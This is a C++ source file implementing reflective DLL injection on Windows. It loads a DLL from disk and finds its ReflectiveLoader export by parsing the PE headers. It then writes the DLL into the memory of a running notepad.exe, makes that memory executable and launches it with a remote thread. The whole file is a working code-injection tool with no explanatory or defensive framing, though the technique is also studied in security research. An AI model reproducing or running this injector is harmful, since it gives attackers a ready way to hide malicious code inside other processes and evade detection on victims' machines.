#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <tlhelp32.h>

std::string GetLastErrorAsString()
{
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0) {
		return std::string(); //No error message has been recorded
	}

	LPSTR messageBuffer = nullptr;

	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)& messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	LocalFree(messageBuffer);

	return message;
}

DWORD FindProcessID(LPWSTR processName) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	PROCESSENTRY32 currentProcessEntry;
	currentProcessEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &currentProcessEntry)) {

		do {
			if (wcsncmp(processName, currentProcessEntry.szExeFile, wcslen(processName)) == 0) {
				return currentProcessEntry.th32ProcessID;
			}

		} while (Process32Next(hSnapshot, &currentProcessEntry));

	}

	return -1;
}

ULONG_PTR ConvertRVAToOffset(PIMAGE_DOS_HEADER pPEFile, DWORD virtualAddress) {

	// Offset = (RVA - VA) + RawAddrOfSection

	PIMAGE_NT_HEADERS64 pImageNtHeaders = (PIMAGE_NT_HEADERS64) (pPEFile->e_lfanew + (LPBYTE)pPEFile);
	PIMAGE_OPTIONAL_HEADER64 pImageOptionalHeader = &pImageNtHeaders->OptionalHeader;
	WORD sizeOfOptionalHeader = pImageNtHeaders->FileHeader.SizeOfOptionalHeader;

	DWORD totalNumberOfSections = pImageNtHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pCurrentSectionHeader = (PIMAGE_SECTION_HEADER)(sizeOfOptionalHeader + (LPBYTE)pImageOptionalHeader);
	PIMAGE_SECTION_HEADER pSectionRelatedToVirtualAddress = NULL;

	for (DWORD i = 0; i < totalNumberOfSections; i++) {

		DWORD sectionStartVA = pCurrentSectionHeader->VirtualAddress;
		DWORD sectionEndVA = pCurrentSectionHeader->VirtualAddress + pCurrentSectionHeader->Misc.VirtualSize;

		if (virtualAddress >= sectionStartVA && virtualAddress <= sectionEndVA) {
			pSectionRelatedToVirtualAddress = pCurrentSectionHeader;
			break;
		}

		pCurrentSectionHeader++;
	}

	if (pSectionRelatedToVirtualAddress == NULL) {
		return -1;
	}


	ULONG_PTR offsetValue = (virtualAddress - pSectionRelatedToVirtualAddress->VirtualAddress) + pSectionRelatedToVirtualAddress->PointerToRawData;

	return offsetValue + (ULONG_PTR) pPEFile;
}

int main()
{
	// 1. Load DLL Payload into a buffer from disk
	LPCSTR injectDLLPath = "C:\\ReflectiveDLL.dll";

	HANDLE hDLLPayload = CreateFileA(injectDLLPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDLLPayload == INVALID_HANDLE_VALUE) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << errorMessage << "\n";
		return -1;
	}

	DWORD dllPayloadSize = GetFileSize(hDLLPayload, NULL);
	PIMAGE_DOS_HEADER pDLLPayloadInHeap = (PIMAGE_DOS_HEADER) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllPayloadSize);
	if (pDLLPayloadInHeap == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << errorMessage << "\n";
		return -1;
	}

	if (!ReadFile(hDLLPayload, pDLLPayloadInHeap, dllPayloadSize, NULL, NULL)) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << errorMessage << "\n";
		return -1;
	}


	// 2. Find offset of the ReflectiveLoader export (The PE file will be parsed as if it is on disk)

	PIMAGE_NT_HEADERS64 pImageNTHeaders = (PIMAGE_NT_HEADERS64)(pDLLPayloadInHeap->e_lfanew + (LPBYTE)pDLLPayloadInHeap);
	PIMAGE_OPTIONAL_HEADER64 pImageOptionalHeader = &pImageNTHeaders->OptionalHeader;


	DWORD virtualAddressOfExportDirectory = pImageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ConvertRVAToOffset(pDLLPayloadInHeap, virtualAddressOfExportDirectory);
	
	DWORD numberOfNames = pExportDirectory->NumberOfNames;
	DWORD* pAddressOfNames = (DWORD* ) ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfNames);
	DWORD reflectiveLoaderExportOffset = 0;

	for (DWORD i = 0; i < numberOfNames; i++) {
		char* currentExportFunctionName = (char*) ConvertRVAToOffset(pDLLPayloadInHeap, pAddressOfNames[i]);

		if (strcmp(currentExportFunctionName, "ReflectiveLoader") == 0) {

			WORD* pAddressOfNameOrdinals = (WORD*)ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfNameOrdinals);
			WORD currentExportFunctionOrdinal = pAddressOfNameOrdinals[i];

			DWORD* pAddressOfFunction = (DWORD*)ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfFunctions);
			DWORD reflectiveLoaderRVA = pAddressOfFunction[currentExportFunctionOrdinal];

			reflectiveLoaderExportOffset = (DWORD)(ConvertRVAToOffset(pDLLPayloadInHeap, reflectiveLoaderRVA) - (ULONG_PTR)pDLLPayloadInHeap);

			break;
		}
	}

	if (reflectiveLoaderExportOffset == 0) {
		printf("Failed to locate ReflectiveLoader export\n");
		return -1;
	}

	// 3. Open handle to forign process, allocate a RW buffer to fit the dll payload

	// Find PID of Target Process
	LPCWSTR injectionTargetProcess = L"notepad.exe";
	DWORD injectionTargetProcessID = FindProcessID((LPWSTR)injectionTargetProcess);

	if (injectionTargetProcessID == -1) {
		wprintf(L"Could not find process: %ls", injectionTargetProcess);
		return 0;
	}

	wprintf(L"Injecting into %ls (%d)\n", injectionTargetProcess, injectionTargetProcessID);

	HANDLE hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, injectionTargetProcessID);
	if (hTargetProcess == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return -1;
	}

	LPVOID remoteBuffer = VirtualAllocEx(hTargetProcess, NULL, dllPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteBuffer == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return -1;
	}

	if (!WriteProcessMemory(hTargetProcess, remoteBuffer, (LPVOID)pDLLPayloadInHeap, dllPayloadSize, NULL)) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return -1;
	}

	// 4. VirtualProtext the buffer to be RX
	DWORD oldProtect = 0;
	if (!VirtualProtectEx(hTargetProcess, remoteBuffer, dllPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to set memory region to RX: " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return -1;
	}



	// 5. Create a remote thread that will run the ReflectiveLoader in the forign process

	LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE) ((LPBYTE) remoteBuffer + reflectiveLoaderExportOffset);

	HANDLE hThread = CreateRemoteThread(hTargetProcess, NULL, 0, lpStartAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Remote thread failed " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return -1;
	}

	printf("Injection is complete");

	return 0;
}

